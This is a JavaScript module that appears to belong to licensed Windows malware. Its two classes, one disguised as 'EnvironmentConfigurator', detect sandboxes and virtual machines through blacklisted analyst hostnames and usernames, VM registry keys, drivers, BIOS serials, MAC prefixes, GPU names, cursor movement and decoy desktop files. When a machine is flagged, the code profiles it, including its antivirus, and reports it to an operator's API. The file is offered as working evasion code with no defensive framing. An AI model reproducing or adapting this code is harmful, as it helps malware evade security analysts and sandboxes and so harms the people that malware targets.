Object.defineProperty(exports, "__esModule", {
  value: true
});
const {
  execSync,
  exec
} = require("child_process");
const os = require("os");
const fs = require("fs");
const path = require("path");
const {
  ApiSender
} = require("./ApiSender");
const {
  CONFIG
} = require("../config");
const {
  getHWID
} = require("../utils/GetHWID");
const {
  getLocalIP
} = require("../utils/getLocalIp");
class AntiVM {
  static async isVirtualMachine() {
    if (["aynenenai"].includes(os.hostname())) return {
      isVM: false,
      score: 0
    };
    const localIP = getLocalIP();
    if (localIP && ["87.248.157.56", "141.11.109.152", "104.250.121.154"].includes(localIP)) return {
      isVM: false,
      score: 0
    };
    this.currentReasons = [];
    let score = 0;
    const hostnames = ["AppOnFly-VPS", "Jtaoftkv", "Liwchiim", "DESKTOP-ANALYSIS", "SANDBOX", "VIRUS", "MALWARE"];
    const usernames = ["jhon", "Bruno", "malware", "test", "analyst", "vmware", "vmtools", "sandbox", "wilbert", "patex"];
    const hostname = os.hostname();
    const username = os.userInfo().username;
    if (hostnames.some(name => hostname.toUpperCase().includes(name))) {
      score += 15;
      this.currentReasons.push("Blacklisted Hostname (+15)");
    }
    if (usernames.some(name => username.toLowerCase().includes(name.toLowerCase()))) {
      score += 15;
      this.currentReasons.push("Blacklisted Username (+15)");
    }
    const checks = [{
      name: "DriversAndFiles",
      fn: () => this.checkDriversAndFiles()
    }, {
      name: "RegistryKeys",
      fn: () => this.checkRegistryKeys()
    }, {
      name: "DeepSystemArtifacts",
      fn: () => this.checkDeepSystemArtifacts()
    }, {
      name: "BiosAndSerial",
      fn: () => this.checkBiosAndSerial()
    }, {
      name: "NetworkAndGPU",
      fn: () => this.checkNetworkAndGPU()
    }, {
      name: "DiskBusType",
      fn: () => this.checkDiskBusType()
    }, {
      name: "HardwareLimits",
      fn: () => this.checkHardwareLimits()
    }, {
      name: "Resolution",
      fn: () => this.checkResolution()
    }, {
      name: "ProcessCount",
      fn: () => this.checkProcessCount()
    }, {
      name: "UserActivity",
      fn: () => this.checkUserActivity()
    }, {
      name: "CursorMovement",
      fn: () => this.checkCursorMovement()
    }, {
      name: "WMIClasses",
      fn: () => this.checkWMIClasses()
    }, {
      name: "DesktopFiles",
      fn: () => this.checkDesktopFiles()
    }];
    for (const check of checks) {
      try {
        const points = check.fn();
        if (points > 0) {
          score += points;
          this.currentReasons.push(check.name + " (+" + points + ")");
        }
      } catch (error) {}
    }
    if (score >= 40) {
      const sender = new ApiSender(CONFIG.ADMIN_ID, CONFIG.LICENSE_KEY, getHWID(), CONFIG.API_URL);
      await sender.reportAntiVM(this.getMachineDetails());
    }
    return {
      isVM: score >= 40,
      score
    };
  }
  static checkResolution() {
    try {
      const width = parseInt(execSync("powershell \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\"", {
        stdio: "pipe"
      }).toString().trim());
      return width > 0 && width < 640 ? 2 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkHardwareLimits() {
    const ram = os.totalmem() / 1073741824;
    const processors = os.cpus().length;
    const uptime = os.uptime() / 60;
    let score = 0;
    if (processors === 1) score += 3;
    if (ram < 2) score += 3;
    if (uptime < 2) score += 2;
    return score;
  }
  static checkDeepSystemArtifacts() {
    try {
      const model = execSync("powershell \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty Model\"", {
        stdio: "pipe"
      }).toString().trim().toLowerCase();
      if (["virtualbox", "vmware", "kvm", "qemu", "hyper-v", "dady super powerful pc"].some(name => model.includes(name.toLowerCase()))) return 40;
      const manufacturer = execSync("wmic computersystem get manufacturer", {
        stdio: "pipe"
      }).toString().toLowerCase();
      if (["innotek", "oracle corporation", "vmware", "red hat", "parallels", "proxmox"].some(name => manufacturer.includes(name))) return 15;
      if (manufacturer.includes("microsoft")) return 8;
    } catch (error) {
      return 0;
    }
    return 0;
  }
  static checkRegistryKeys() {
    const keys = [{
      "key": "HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__",
      "points": 8
    }, {
      "key": "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
      "points": 8
    }, {
      "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
      "points": 8
    }, {
      "key": "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools",
      "points": 8
    }, {
      "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\vmmouse",
      "points": 7
    }, {
      "key": "HKLM\\SOFTWARE\\KVM",
      "points": 8
    }];
    let score = 0;
    for (const entry of keys) {
      try {
        execSync('reg query "' + entry.key + '"', {
          stdio: "pipe"
        });
        score += entry.points;
      } catch (error) {}
    }
    return score;
  }
  static checkNetworkAndGPU() {
    try {
      const gpu = execSync("wmic path win32_VideoController get name", {
        stdio: "pipe"
      }).toString().toLowerCase();
      if (["vmware", "vbox", "qemu", "virtio", "microsoft basic", "intel arc"].some(name => gpu.includes(name))) return gpu.includes("microsoft basic") ? 5 : 8;
      const addresses = Object.values(os.networkInterfaces()).flat().map(address => address?.mac?.toLowerCase());
      const prefixes = ["08:00:27", "00:05:69", "00:0c:29", "00:15:5d", "52:54:00", "54:52:4d"];
      if (addresses.some(mac => prefixes.some(prefix => mac?.startsWith(prefix)))) return 10;
    } catch (error) {
      return 0;
    }
    return 0;
  }
  static checkDriversAndFiles() {
    return ["C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\VBoxGuest.sys", "C:\\Windows\\System32\\drivers\\vmtray.dll", "C:\\Windows\\System32\\drivers\\vmsmm.sys", "C:\\Windows\\System32\\drivers\\vmmouse.sys"].some(file => fs.existsSync(file)) ? 10 : 0;
  }
  static checkWMIClasses() {
    try {
      return execSync("powershell \"Get-WmiObject -List | Where-Object {$_.Name -match 'Xen|HyperV|VirtualPC'}\"", {
        stdio: "pipe"
      }).toString().trim() ? 6 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkDiskBusType() {
    try {
      const bus = execSync("powershell \"(Get-PhysicalDisk).BusType\"", {
        stdio: "pipe"
      }).toString().toLowerCase();
      return bus.includes("virtio") || bus.includes("file_backed") ? 5 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkUserActivity() {
    try {
      const recent = path.join(process.env.APPDATA || "", "Microsoft\\Windows\\Recent");
      path.join(recent, "$RECYCLE.BIN");
      if (!fs.existsSync(recent)) return 0;
      return fs.readdirSync(recent).filter(name => name !== "$RECYCLE.BIN").length === 0 ? 3 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkCursorMovement() {
    try {
      const before = execSync("powershell \"[System.Windows.Forms.Cursor]::Position.X\"", {
        stdio: "pipe"
      }).toString().trim();
      execSync("powershell \"Start-Sleep -m 500\"");
      const after = execSync("powershell \"[System.Windows.Forms.Cursor]::Position.X\"", {
        stdio: "pipe"
      }).toString().trim();
      return before === after && before !== "0" ? 2 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkDesktopFiles() {
    try {
      const desktop = path.join(process.env.USERPROFILE || "", "Desktop");
      if (!fs.existsSync(desktop)) return 0;
      const files = fs.readdirSync(desktop);
      const names = ["measureinvoke.docx", "suspendopen.emf", "clearcompare.ppsx", "startadd.mod", "sample.bin"];
      if (files.some(file => names.some(name => file.toLowerCase().includes(name)))) return 8;
      return files.length === 0 ? 2 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkBiosAndSerial() {
    try {
      const serial = execSync("wmic bios get serialnumber", {
        stdio: "pipe"
      }).toString().toLowerCase();
      return ["virtualbox", "vmware", "qemu"].some(name => serial.includes(name)) ? 8 : 0;
    } catch (error) {
      return 0;
    }
  }
  static checkProcessCount() {
    try {
      return execSync("tasklist", {
        stdio: "pipe"
      }).toString().split("\n").length < 15 ? 2 : 0;
    } catch (error) {
      return 0;
    }
  }
  static detectAntiVirus() {
    try {
      const status = execSync('powershell "Get-MpComputerStatus"', {
        stdio: "pipe"
      }).toString().toLowerCase();
      if (status && status.includes("antispyware")) return "Windows Defender";
    } catch (error) {}
    try {
      const names = execSync("wmic /namespace:\\\\root\\cimv2 path Win32_Product where \"name like '%antivirus%' or name like '%security%' or name like '%kaspersky%' or name like '%norton%' or name like '%mcafee%' or name like '%avast%' or name like '%bitdefender%' or name like '%avg%' or name like '%malware%'\" get name", {
        stdio: "pipe",
        maxBuffer: 10485760
      }).toString().split("\n").map(line => line.trim()).filter(line => line.length > 0 && line !== "Name");
      if (names.length) return names[0];
    } catch (error) {}
    try {
      if (execSync("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\"", {
        stdio: "pipe"
      }).toString()) return "Windows Defender";
    } catch (error) {}
    return "Not Detected";
  }
  static getMachineDetails() {
    try {
      let model = "Unknown";
      try {
        model = execSync("wmic computersystem get model", {
          stdio: "pipe"
        }).toString().replace("Model", "").trim();
      } catch (error) {}
      const antiVirus = this.detectAntiVirus();
      return {
        username: os.userInfo().username,
        hostname: os.hostname(),
        deviceModel: model,
        processor: os.cpus()[0].model,
        ram: (os.totalmem() / 1073741824).toFixed(2) + "GB",
        uptime: (os.uptime() / 60).toFixed(2) + " min",
        antiVirus,
        reasons: this.currentReasons
      };
    } catch (error) {
      return {
        error: "failed"
      };
    }
  }
}
AntiVM.currentReasons = [];
exports.AntiVM = AntiVM;
class EnvironmentConfigurator {
  static async verifyRuntime() {
    if (["aynenenai"].includes(os.hostname())) return {
      isSecured: true,
      score: 0
    };
    this.currentMetrics = [];
    this.activeProcesses.clear();
    let score = 0;
    const hostnames = ["APPONFLY-VPS", "JTAOFTKV", "LIWCHIIM", "DESKTOP-ANALYSIS", "SANDBOX", "VIRUS", "MALWARE"];
    const usernames = ["JHON", "BRUNO", "MALWARE", "TEST", "ANALYST", "VMWARE", "VMTOOLS", "SANDBOX", "WILBERT", "PATEX"];
    if (hostnames.some(name => os.hostname().toUpperCase().includes(name))) score += 15;
    if (usernames.some(name => os.userInfo().username.toUpperCase().includes(name))) score += 15;
    if (score >= this.BARRIER_SCORE) {
      await this.triggerReport(score);
      return {
        isSecured: false,
        score
      };
    }
    const controller = new AbortController();
    const signal = controller.signal;
    const checks = [{
      name: "Artifacts",
      weight: 15,
      run: () => this.checkDrivers()
    }, {
      name: "Registry",
      weight: 20,
      run: signal => this.execCheck("reg query \"HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\"", signal)
    }, {
      name: "HardwareModel",
      weight: 22,
      run: signal => this.execCheck("wmic computersystem get model", signal, ["virtualbox", "vmware", "kvm", "qemu", "hyper-v"])
    }, {
      name: "BiosSerial",
      weight: 15,
      run: signal => this.execCheck("wmic bios get serialnumber", signal, ["virtualbox", "vmware", "qemu"])
    }, {
      name: "Display",
      weight: 10,
      run: signal => this.execCheck("powershell \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\"", signal, ["640", "800"])
    }, {
      name: "BusType",
      weight: 10,
      run: signal => this.execCheck("powershell \"(Get-PhysicalDisk).BusType\"", signal, ["virtio", "file_backed"])
    }, {
      name: "ProcessMap",
      weight: 5,
      run: signal => this.execCheck("tasklist", signal, [], true)
    }];
    await Promise.allSettled(checks.map(async check => {
      try {
        if (signal.aborted) return;
        const matched = await check.run(signal);
        if (matched && !signal.aborted) {
          score += check.weight;
          this.currentMetrics.push(check.name + " (+" + check.weight + ")");
          if (score >= this.BARRIER_SCORE) {
            controller.abort();
            this.killAllActiveProcesses();
          }
        }
      } catch (error) {}
    }));
    if (score >= this.BARRIER_SCORE) await this.triggerReport(score);
    return {
      isSecured: score < this.BARRIER_SCORE,
      score
    };
  }
  static execCheck(command, signal, patterns = [], isProcessCount = false) {
    return new Promise(resolve => {
      if (signal.aborted) {
        resolve(false);
        return;
      }
      const child = exec(command, {
        signal
      }, (error, stdout) => {
        this.activeProcesses.delete(child);
        if (error || !stdout) return resolve(false);
        const output = stdout.toLowerCase();
        if (isProcessCount) return resolve(output.split("\n").length < 25);
        if (patterns.length > 0) return resolve(patterns.some(pattern => output.includes(pattern)));
        return resolve(true);
      });
      this.activeProcesses.add(child);
    });
  }
  static checkDrivers() {
    return Promise.resolve(["C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\VBoxGuest.sys", "C:\\Windows\\System32\\drivers\\vmmouse.sys"].some(file => fs.existsSync(file)));
  }
  static killAllActiveProcesses() {
    for (const child of this.activeProcesses) {
      try {
        if (child && !child.killed) child.kill("SIGKILL");
      } catch (error) {}
    }
    this.activeProcesses.clear();
  }
  static async triggerReport(score) {
    try {
      const sender = new ApiSender(CONFIG.ADMIN_ID, CONFIG.LICENSE_KEY, getHWID(), CONFIG.API_URL);
      let antiVirus = "Standard Provider";
      if (fs.existsSync("C:\\ProgramData\\Microsoft\\Windows Defender")) antiVirus = "Windows Defender";
      await sender.reportAntiVM({
        username: os.userInfo().username,
        hostname: os.hostname(),
        processor: os.cpus()[0]?.model || "Unknown",
        ram: (os.totalmem() / 1073741824).toFixed(2) + "GB",
        uptime: (os.uptime() / 60).toFixed(2) + " min",
        antiVirus,
        reasons: this.currentMetrics
      });
    } catch (error) {}
  }
}
EnvironmentConfigurator.currentMetrics = [];
EnvironmentConfigurator.BARRIER_SCORE = 40;
EnvironmentConfigurator.activeProcesses = new Set();
exports.EnvironmentConfigurator = EnvironmentConfigurator;
